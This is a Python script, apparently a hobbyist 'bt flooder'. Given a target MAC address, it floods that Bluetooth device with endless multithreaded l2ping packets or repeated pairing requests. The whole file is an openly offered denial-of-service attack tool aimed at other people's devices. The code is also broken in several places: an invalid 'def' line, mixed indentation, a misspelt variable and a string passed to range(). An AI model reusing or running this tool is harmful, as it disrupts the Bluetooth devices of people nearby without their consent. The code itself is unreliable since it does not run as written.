import os
import sys
import subprocess
import time
import threading
def hwus = run_cmd(command: str):
        process = subprocess.Popen(command, shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE)
        stdout, stderr = process.communicate()
        return stdout.decode("utf-8")
print("___.    __  .__      _____.__                    .___            \n\\_ |___/  |_|  |   _/ ____\\  |   ____   ____   __| _/___________ \n | __ \\   __\\  |   \\   __\\|  |  /  _ \\ /  _ \\ / __ |/ __ \\_  __ \\\n | \\_\\ \\  | |  |__  |  |  |  |_(  <_> |  <_> ) /_/ \\  ___/|  | \\/\n |___  /__| |____/  |__|  |____/\\____/ \\____/\\____ |\\___  >__|   \n     \\/                                           \\/    \\/       ")
print("widow9098#0353")
cmd = sys.argv[1]
if (cmd == "on"):
	print("hci0 up")
    hwus = run_cmd("hciconfig hci0 up")
elif (cmd == "off"):
	print("hci0 down")
    hwus = run_cmd("hciconfig hci0 down")
elif (cmd == "scan"):
    hwus = run_cmd("hcitool scan")
elif (len(sys.argv) != 4):
    print("methods: pair/l2ping")
    print("utils: scan/on/off")
    print(sys.argv[0] + " <pair/l2ping> <mac> <threads>")
    print(sys.argv[0] + " <scan/on/off>")    
else:
    method = sys.argv[1]
    macadd = sys.argv[2]
    threadnum = sys.argv[3]
    if (method == "l2ping"):
        def loopback():
            while True: 
                hwus = run_cmd("l2ping -c 1 -s 700 -t 3 " + macadd) 
                print("sent packet to " + macadd + " size:700")
        print("running " + method + " attack on " + macadd + " with " + threadnum + " threads")
        for i in range(treadnum):
            threading.Thread(target = loopback).start()
    elif (method == "pair"):
        def loopback():
            while True:
                hwus = run_cmd("bluetoothctl power on") 
                hwus = run_cmd("bluetoothctl discoverable on") 
                hwus = run_cmd("bluetoothctl pairable on") 
                hwus = run_cmd("bluetoothctl agent on") 
                hwus = run_cmd("bluetoothctl default-agent") 
                hwus = run_cmd("timeout 1s bluetoothctl scan on")  
                hwus = run_cmd("timeout 2s bluetoothctl pair " + macadd) 
                print("sent pair packet to " + macadd)
        print("running " + method + " attack on " + macadd)
        threading.Thread(target = loopback).start()
    else:
        print("u fucked up the cmd")
